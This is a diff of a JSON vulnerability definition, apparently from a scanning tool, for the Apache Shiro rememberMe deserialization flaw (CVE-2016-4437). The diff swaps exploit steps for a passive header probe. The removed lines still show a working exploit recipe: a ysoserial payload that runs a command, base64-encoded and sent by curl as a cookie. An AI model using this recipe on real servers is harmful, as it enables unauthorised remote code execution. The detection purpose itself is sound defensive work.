@@ -1,5 +1,6 @@
 {
   "vuln_id": "shiro_cve2016_4437",
+  "dispatch_skill": "shiro_rce",
   "description": "Apache Shiro 1.2.4及之前版本存在Java反序列化漏洞，攻击者可通过构造恶意的rememberMe Cookie实现远程代码执行",
   "category": "java_deserialization",
   "cves": [
@@ -27,20 +28,25 @@
     "/logout"
   ],
   "detection_method": "发送GET请求到目标URL，检查响应头中是否包含Set-Cookie: rememberMe=deleteMe，如果存在则表明目标使用Shiro框架且可能受漏洞影响",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "使用ysoserial生成CommonsCollections2 payload并编码为rememberMe Cookie",
-      "command": "java -jar ysoserial.jar CommonsCollections2 'touch /tmp/success' > payload.bin && python -c \"import sys, base64; print(base64.b64encode(open('payload.bin','rb').read()).decode())\"",
-      "expected_result": "生成base64编码的payload字符串",
-      "notes": "需要安装ysoserial工具，可使用其他CommonsCollections变体如CommonsCollections1/3/4/5/6/7"
-    },
-    {
-      "step": 2,
-      "description": "发送包含恶意rememberMe Cookie的HTTP请求",
-      "command": "curl -v http://{TARGET}/ -H 'Cookie: rememberMe={BASE64_PAYLOAD}'",
-      "expected_result": "返回正常HTTP响应（200/302等），并在目标服务器上执行命令",
-      "notes": "将{BASE64_PAYLOAD}替换为上一步生成的base64字符串，注意Cookie值不要包含引号"
+      "id": "shiro_rememberme_probe",
+      "description": "GET / 观察 rememberMe=deleteMe 响应头",
+      "method": "GET",
+      "path": "/",
+      "headers": {
+        "Cookie": "rememberMe=test"
+      },
+      "timeout": 8,
+      "success_signs": {
+        "header_contains": [
+          [
+            "Set-Cookie",
+            "rememberMe=deleteMe"
+          ]
+        ]
+      },
+      "confidence": 0.95
     }
   ],
   "verification_command": "curl -v http://{TARGET}/ -H 'Cookie: rememberMe=dGVzdA=='",
